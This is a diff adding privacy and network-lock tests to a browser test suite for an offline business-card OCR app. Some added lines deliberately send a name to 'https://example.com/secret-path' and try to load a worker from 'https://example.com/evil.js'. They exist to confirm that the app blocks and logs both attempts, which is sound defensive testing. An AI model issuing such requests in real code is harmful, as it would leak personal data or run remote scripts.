@@ -170,7 +170,13 @@ const ok = (n, c, d = '') => { c ? (pass++, console.log('PASS', n)) : (fail++, c
   await page.click('#addressAutocompleteList button'); await page.waitForTimeout(100);
   ok('choosing a suggestion fills city/zip', (await val('city')) === 'San Francisco' && (await val('zip')) === '94105');
 
-  // OCR flow: bundled Tesseract.js reads a rendered card offline
+  // OCR flow: bundled Tesseract.js reads a rendered card offline (through MOD01's worker network lock)
+  // Bus payloads are signals only (source tree only: in the build the bus is bundled and cannot be imported from here)
+  if (!process.env.SERVE_DIR) await page.evaluate(async () => {
+    const { globalEventBus, Events } = await import('/src/share/eventBus.js');
+    window.__busSeen = [];
+    [Events.IMAGE_CAPTURED, Events.OCR_TEXT_EXTRACTED].forEach(ev => globalEventBus.subscribe(ev, d => window.__busSeen.push(JSON.stringify(d))));
+  });
   await page.setInputFiles('#imageUpload', await renderCardImage(page)); await page.waitForTimeout(300);
   ok('upload opens review modal', await visible('cropReviewModal'));
   await page.click('#runOcrBtn');
@@ -186,6 +192,10 @@ const ok = (n, c, d = '') => { c ? (pass++, console.log('PASS', n)) : (fail++, c
   ok('real OCR extracts phone, email, website', got.phoneWork === '+1 (312) 555-0147' && got.email === 'maria.gonzalez@northwind.com' && got.website === 'https://northwind.com', JSON.stringify(got));
   ok('real OCR extracts street, city, state, zip', got.street === '233 South Wacker Drive' && got.city === 'Chicago' && got.state === 'IL' && got.zip === '60606', JSON.stringify(got));
   ok('user told the form was filled', (await text('toastMessage')).includes('Form filled'));
+  if (!process.env.SERVE_DIR) {
+    const seen = await page.evaluate(() => window.__busSeen);
+    ok('bus carries no photo or OCR text, only signals', seen.length === 2 && !seen.some(d => /data:image|Gonzalez|northwind/i.test(d)), seen.join(' | ').slice(0, 300));
+  }
   ok('audit log records OCR (not simulated)', (await text('auditLog')).includes('OCR text extracted') && !(await text('auditLog')).includes('simulated'));
   const qrAfter = await decodeQr(page);
   ok('QR follows OCR result', qrAfter && qrAfter.includes('FN:Maria Gonzalez\r\n') && qrAfter.includes('N:Gonzalez;Maria;;;\r\n'), qrAfter);
@@ -207,6 +217,17 @@ const ok = (n, c, d = '') => { c ? (pass++, console.log('PASS', n)) : (fail++, c
   ok('gatekeeper blocks XHR, WebSocket, EventSource, sendBeacon', Object.values(other).every(v => v === 'blocked'), JSON.stringify(other));
   const sameOrigin = await page.evaluate(() => fetch('/index.html').then(r => r.status, () => 'blocked'));
   ok('same-origin fetch still allowed', sameOrigin === 200, String(sameOrigin));
+  await page.evaluate(() => fetch('https://example.com/secret-path?name=Maria').catch(() => {})); await page.waitForTimeout(100);
+  const log = await text('auditLog');
+  ok('audit log names only the blocked host, never the path or query', log.includes('https://example.com') && !log.includes('secret-path') && !log.includes('Maria'), log.slice(0, 200));
+  ok('event bus is not exposed on window', await page.evaluate(() => typeof window.vCGE === 'undefined'));
+  ok('network lock is the first script and installed', await page.evaluate(() => document.scripts[0].src.endsWith('/src/modules/mod01-shell/netLock.js') && !!fetch[Symbol.for('vcge.netLock')]));
+  const guardRefuses = await page.evaluate(() => new Promise(resolve => {
+    const w = new Worker(`src/modules/mod01-shell/workerGuard.js#${encodeURIComponent('https://example.com/evil.js')}`);
+    w.onerror = (e) => { e.preventDefault(); w.terminate(); resolve('refused'); };
+    setTimeout(() => { w.terminate(); resolve('loaded'); }, 2000);
+  }));
+  ok('OCR worker lock refuses a script from another host', guardRefuses === 'refused', guardRefuses);
 
   // Flip & theme
   await page.click('#flipCardBtn');
